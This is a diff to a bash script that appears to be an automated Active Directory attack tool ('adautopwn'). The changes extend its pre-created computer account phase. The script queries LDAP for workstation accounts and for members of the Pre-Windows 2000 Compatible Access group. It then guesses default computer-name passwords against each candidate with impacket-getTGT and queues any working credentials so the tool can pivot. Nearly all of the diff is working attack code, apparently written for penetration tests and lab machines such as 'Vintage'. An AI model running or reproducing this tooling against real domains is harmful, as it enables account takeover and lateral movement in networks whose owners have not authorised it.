@@ -22,7 +22,7 @@ set -o pipefail
 # ===========================================================================
 #  METADATA
 # ===========================================================================
-readonly VERSION="1.55.0"
+readonly VERSION="1.55.1"
 readonly AUTHOR="c4sh3r"
 KERBRUTE_BIN="${KERBRUTE_BIN:-/opt/kerbrute}"
 KERBRUTE_RC4_DEAD=0               # set when the DC rejects RC4 (KDC_ERR_ETYPE_NOSUPP) → kerbrute unusable, spray via netexec
@@ -1417,6 +1417,67 @@ phase_kerberoast() {
 #  PRE-CREATED COMPUTER ACCOUNTS
 # ===========================================================================
 PRECREATED_DONE=0
+
+# Build a ranked list of legacy computer-account candidates from two LDAP
+# result sets:
+#   1. enabled workstation-trust accounts and their password/logon metadata;
+#   2. the direct members of BUILTIN\Pre-Windows 2000 Compatible Access,
+#      resolved by its language-independent SID (S-1-5-32-554).
+#
+# Group membership is the high-confidence signal that catches accounts such as
+# Vintage's FS01$: their default password can still be the lowercase computer
+# name even when userAccountControl is no longer exactly 4128.  The historical
+# password/logon/UAC heuristics remain as a secondary source.
+_pre2k_build_candidates() {
+    local computers_ldif="$1" group_ldif="$2" output="$3"
+    local map members combined
+    map=$(mktemp "${TMPDIR:-/tmp}/adautopwn-pre2k-map.XXXXXX") || return 1
+    members=$(mktemp "${TMPDIR:-/tmp}/adautopwn-pre2k-members.XXXXXX") || { rm -f "$map"; return 1; }
+    combined=$(mktemp "${TMPDIR:-/tmp}/adautopwn-pre2k-candidates.XXXXXX") || {
+        rm -f "$map" "$members"; return 1
+    }
+
+    # ldapsearch is called with ldif-wrap=no, so every DN/member stays on one
+    # line.  Keep the UAC check here as defence in depth if another caller feeds
+    # this helper an unfiltered computer dump: never password-guess a DC.
+    awk '
+        BEGIN { RS=""; FS="\n" }
+        /sAMAccountName:/ {
+            dn=""; sam=""; pwd=""; last=""; logons=""; uac=""
+            for (i=1; i<=NF; i++) {
+                if ($i ~ /^distinguishedName:/)   { dn=$i;     sub(/^distinguishedName:[[:space:]]*/, "", dn) }
+                if ($i ~ /^sAMAccountName:/)      { sam=$i;    sub(/^sAMAccountName:[[:space:]]*/, "", sam) }
+                if ($i ~ /^pwdLastSet:/)          { pwd=$i;    sub(/^pwdLastSet:[[:space:]]*/, "", pwd) }
+                if ($i ~ /^lastLogonTimestamp:/)  { last=$i;   sub(/^lastLogonTimestamp:[[:space:]]*/, "", last) }
+                if ($i ~ /^logonCount:/)          { logons=$i; sub(/^logonCount:[[:space:]]*/, "", logons) }
+                if ($i ~ /^userAccountControl:/)  { uac=$i;    sub(/^userAccountControl:[[:space:]]*/, "", uac) }
+            }
+            # 8192 = SERVER_TRUST_ACCOUNT (domain controller).
+            if (dn != "" && sam ~ /\$$/ && int(uac / 8192) % 2 == 0)
+                print dn "\t" sam "\t" pwd "\t" last "\t" logons "\t" uac
+        }
+    ' "$computers_ldif" >"$map"
+
+    sed -n 's/^member:[[:space:]]*//p' "$group_ldif" | awk 'NF { print tolower($0) }' | sort -u >"$members"
+
+    # Emit group-derived candidates first so they win the per-account dedup.
+    awk -F '\t' '
+        FILENAME == ARGV[1] { member[$0]=1; next }
+        member[tolower($1)] { print $2 "\t" $3 "\t" $4 "\t" $5 "\t" $6 "\tpre-windows-2000-compatible-access" }
+    ' "$members" "$map" >"$combined"
+
+    awk -F '\t' '
+        # PASSWD_NOTREQD (32), an unset password timestamp, or no historical
+        # logon signal are the lower-confidence legacy/pre-staging indicators.
+        ($3 == "0" || $4 == "" || $4 == "0" || $5 == "" || $5 == "0" || int($6 / 32) % 2 == 1) {
+            print $2 "\t" $3 "\t" $4 "\t" $5 "\t" $6 "\tpassword/logon heuristic"
+        }
+    ' "$map" >>"$combined"
+
+    awk -F '\t' '!seen[tolower($1)]++' "$combined" | sort -f >"$output"
+    rm -f "$map" "$members" "$combined"
+}
+
 phase_precreated_computers() {
     [[ "$HAVE_AUTH" != "1" ]] && return
     [[ "$PRECREATED_DONE" == "1" ]] && return
@@ -1433,7 +1494,7 @@ phase_precreated_computers() {
         local pre="$OUTDIR/precreated_computers_nxc.txt"
         run "$NXC ldap $DCT ${args[*]} -M pre2k"
         $NXC ldap "$DCT" "${args[@]}" -M pre2k 2>&1 | tee -a "$LOGFILE" | tee "$pre"
-        local stem queued=0
+        local pre2k_rc=${PIPESTATUS[0]} stem queued=0
         # CONFIRMED: pre2k prints "Successfully obtained TGT for <name>@domain" when the
         # default password (lowercase computer name) worked → QUEUE that cred so the
         # engine actually pivots as the computer account (the old code only noted it).
@@ -1452,58 +1513,67 @@ phase_precreated_computers() {
             note_cred_source "$acc" "NetExec pre2k module"
             queue_cred "$acc" "${stem,,}" "" "Pre-created computer (pre2k, default pw)"; queued=1
         done < <(grep -oiP 'Pre-created computer account:\s*\K\S+\$' "$pre" 2>/dev/null | sort -u)
-        [[ "$queued" == "1" ]] && loot "Pre-created computer accounts queued → precreated_computers_nxc.txt"
-        return
+        if [[ "$queued" == "1" ]]; then
+            loot "Pre-created computer accounts queued → precreated_computers_nxc.txt"
+            return
+        fi
+        if (( pre2k_rc != 0 )); then
+            warn "NetExec pre2k failed (exit $pre2k_rc) → continuing with the LDAP/Kerberos fallback"
+        else
+            info "NetExec pre2k returned no usable accounts → continuing with the LDAP/Kerberos fallback"
+        fi
     fi
 
-    local base="dc=${DOMAIN//./,dc=}" raw="$OUTDIR/precreated_computers_ldap.txt" cand="$OUTDIR/precreated_computers.txt"
-    : >"$raw"; : >"$cand"
+    local base="dc=${DOMAIN//./,dc=}" raw="$OUTDIR/precreated_computers_ldap.txt"
+    local group_raw="$OUTDIR/precreated_prewin2000_group_ldap.txt" cand="$OUTDIR/precreated_computers.txt"
+    : >"$raw"; : >"$group_raw"; : >"$cand"
 
     if [[ -n "$KERB_TICKET" ]]; then
-        run "ldapsearch -Y GSSAPI computers with pwdLastSet/lastLogonTimestamp"
-        KRB5CCNAME="$KERB_TICKET" ldapsearch -LLL -Y GSSAPI -H "ldap://${DC_FQDN:-$DC_IP}" -b "$base" \
-            '(&(objectCategory=computer)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))' \
-            sAMAccountName pwdLastSet lastLogonTimestamp userAccountControl 2>/dev/null >"$raw"
+        run "ldapsearch -Y GSSAPI workstation accounts + Pre-Windows 2000 Compatible Access members"
+        KRB5CCNAME="$KERB_TICKET" ldapsearch -LLL -o ldif_wrap=no -Y GSSAPI -H "ldap://${DC_FQDN:-$DC_IP}" -b "$base" \
+            '(&(objectCategory=computer)(!(userAccountControl:1.2.840.113556.1.4.803:=2))(!(userAccountControl:1.2.840.113556.1.4.803:=8192)))' \
+            distinguishedName sAMAccountName pwdLastSet lastLogonTimestamp logonCount userAccountControl 2>/dev/null >"$raw"
+        KRB5CCNAME="$KERB_TICKET" ldapsearch -LLL -o ldif_wrap=no -Y GSSAPI -H "ldap://${DC_FQDN:-$DC_IP}" -b "$base" \
+            '(&(objectClass=group)(objectSid=S-1-5-32-554))' distinguishedName member 2>/dev/null >"$group_raw"
     elif [[ -n "$PASS" ]]; then
-        run "ldapsearch simple bind as $USER for computer account candidates"
-        ldapsearch -LLL -x -H "ldap://$DC_IP" -D "${USER}@${DOMAIN}" -w "$PASS" -b "$base" \
-            '(&(objectCategory=computer)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))' \
-            sAMAccountName pwdLastSet lastLogonTimestamp userAccountControl 2>/dev/null >"$raw"
+        run "ldapsearch simple bind as $USER for workstation accounts + Pre-Windows 2000 Compatible Access members"
+        ldapsearch -LLL -o ldif_wrap=no -x -H "ldap://$DC_IP" -D "${USER}@${DOMAIN}" -w "$PASS" -b "$base" \
+            '(&(objectCategory=computer)(!(userAccountControl:1.2.840.113556.1.4.803:=2))(!(userAccountControl:1.2.840.113556.1.4.803:=8192)))' \
+            distinguishedName sAMAccountName pwdLastSet lastLogonTimestamp logonCount userAccountControl 2>/dev/null >"$raw"
+        ldapsearch -LLL -o ldif_wrap=no -x -H "ldap://$DC_IP" -D "${USER}@${DOMAIN}" -w "$PASS" -b "$base" \
+            '(&(objectClass=group)(objectSid=S-1-5-32-554))' distinguishedName member 2>/dev/null >"$group_raw"
     else
         info "Current credential is hash-only and no Kerberos LDAP bind is available → skipping"
-        rm -f "$raw" "$cand"
+        rm -f "$raw" "$group_raw" "$cand"
         return
     fi
 
-    awk '
-        BEGIN { RS=""; FS="\n" }
-        /sAMAccountName:/ {
-            sam=""; pwd=""; last=""; uac="";
-            for (i=1; i<=NF; i++) {
-                if ($i ~ /^sAMAccountName:/)      { sam=$i;  sub(/^sAMAccountName:[[:space:]]*/, "", sam) }
-                if ($i ~ /^pwdLastSet:/)          { pwd=$i;  sub(/^pwdLastSet:[[:space:]]*/, "", pwd) }
-                if ($i ~ /^lastLogonTimestamp:/)  { last=$i; sub(/^lastLogonTimestamp:[[:space:]]*/, "", last) }
-                if ($i ~ /^userAccountControl:/)  { uac=$i;  sub(/^userAccountControl:[[:space:]]*/, "", uac) }
-            }
-            if (sam != "" && (pwd == "0" || last == "" || last == "0"))
-                print sam "\t" pwd "\t" last "\t" uac
-        }
-    ' "$raw" | sort -u >"$cand"
+    _pre2k_build_candidates "$raw" "$group_raw" "$cand" || {
+        warn "Could not parse LDAP pre-created computer candidates"
+        return
+    }
 
     if [[ ! -s "$cand" ]]; then
         info "No clear pre-created computer candidates found"
         return
     fi
 
-    loot "$(wc -l <"$cand") computer account candidate(s) with unset password age/logon signals"
-    local sam stem pw got=0 tried=0 max=40
-    while IFS=$'\t' read -r sam _; do
+    local group_count
+    group_count=$(awk -F '\t' '$6 == "pre-windows-2000-compatible-access" { n++ } END { print n+0 }' "$cand")
+    loot "$(wc -l <"$cand") pre-created computer candidate(s) (${group_count} from Pre-Windows 2000 Compatible Access)"
+    local sam stem legacy pw source got=0 tried=0 max=40
+    local -A tested_passwords=()
+    while IFS=$'\t' read -r sam _ _ _ _ source; do
         [[ -z "$sam" || "$sam" != *\$ ]] && continue
         (( tried++ ))
         (( tried > max )) && { warn "Candidate cap reached ($max) to avoid excessive auth attempts"; break; }
         stem="${sam%$}"
-        for pw in "$stem" "${stem,,}" "${stem^^}"; do
+        legacy="${stem:0:14}"
+        info "Testing ${sam} (${source:-LDAP heuristic})"
+        for pw in "${legacy,,}" "$legacy" "${legacy^^}"; do
             [[ -z "$pw" ]] && continue
+            [[ -n "${tested_passwords["${sam,,}|$pw"]+x}" ]] && continue
+            tested_passwords["${sam,,}|$pw"]=1
             run "impacket-getTGT ${DOMAIN}/${sam}:<candidate> -dc-ip $DC_IP"
             rm -f "${sam}.ccache"
             if impacket-getTGT "${DOMAIN}/${sam}:${pw}" -dc-ip "$DC_IP" 2>&1 | tee -a "$LOGFILE" | grep -qiE 'Saving ticket|saved in'; then
@@ -7920,7 +7990,8 @@ finalize_loot() {
     _mv_loot secrets laps.txt gmsa.txt dmsa.txt gpp.txt dpapi.txt winrm_users.txt share_secrets.txt \
         coerce.txt relay_ldap.txt trusts.txt certipy_find.txt disabled_accounts.txt \
         deleted_objects.txt disabled_or_locked.txt must_change_password.txt \
-        precreated_computers.txt precreated_computers_ldap.txt nopac_scan_*.txt nopac_abuse_*.txt \
+        precreated_computers.txt precreated_computers_ldap.txt precreated_prewin2000_group_ldap.txt \
+        nopac_scan_*.txt nopac_abuse_*.txt \
         ad_attack_surface.txt ad_attack_surface_ldap.txt cve_checks_unauth.txt cve_checks_auth.txt
 
     local f
